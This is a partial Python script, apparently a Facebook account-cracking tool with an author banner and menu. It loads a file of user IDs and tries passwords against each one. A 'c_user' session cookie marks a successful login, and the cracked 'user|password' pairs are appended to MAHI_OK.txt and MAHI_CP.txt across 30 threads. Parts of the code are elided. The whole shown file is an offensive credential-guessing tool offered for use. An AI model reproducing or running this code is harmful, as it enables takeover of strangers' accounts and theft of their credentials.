...
from concurrent.futures import ThreadPoolExecutor as MAHABUBssb
...
__/\\\\____________/\\\\_____/\\\\\\\\\_____/\\\________/\\\__/\\\\\\\\\\\_        
 _\/\\\\\\________/\\\\\\___/\\\\\\\\\\\\\__\/\\\_______\/\\\_\/////\\\///__       
  _\/\\\//\\\____/\\\//\\\__/\\\/////////\\\_\/\\\_______\/\\\_____\/\\\_____      
    ...
    _\/\\\__\///\\\/___\/\\\_\/\\\\\\\\\\\\\\\_\/\\\/////////\\\_____\/\\\_____    
     _\/\\\____\///_____\/\\\_\/\\\/////////\\\_\/\\\_______\/\\\_____\/\\\_____   
      _\/\\\_____________\/\\\_\/\\\_______\/\\\_\/\\\_______\/\\\_____\/\\\_____  
       _\/\\\_____________\/\\\_\/\\\_______\/\\\_\/\\\_______\/\\\__/\\\\\\\\\\\_ 
        _\///______________\///__\///________\///__\///________\///__\///////////__033
__________________×______________________
__________________×______________________
  
  Auther   : MAHI BHUIYAN 
 
  Github   :https://github.com/Tonu-143

  Facebook : MAHI BHUIYAN 
  
  Contact : LOVE NAI BRO 
...
def MAHABUB():
    ...
    print(' [3] BACK')
    print('')
    _MAHABUB___ = input(' [?] Choose option : ')
...
class __xxx__:
    def __init__(self):
        self.id = []
    def MAHABUBx(self,id):
        os.system("clear")
        print(logo)
        print("\u001b[34;1m[°°]  EXM: /sdcard/filename.txt")
        print("\u001b[35;1m==============================")
        self.cnt = input('\u001b[35;1m[•]Put File Name : ')
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MAHI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MAHI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MAHI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MAHI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with MAHABUBssb(max_workers=30) as ssbworld:
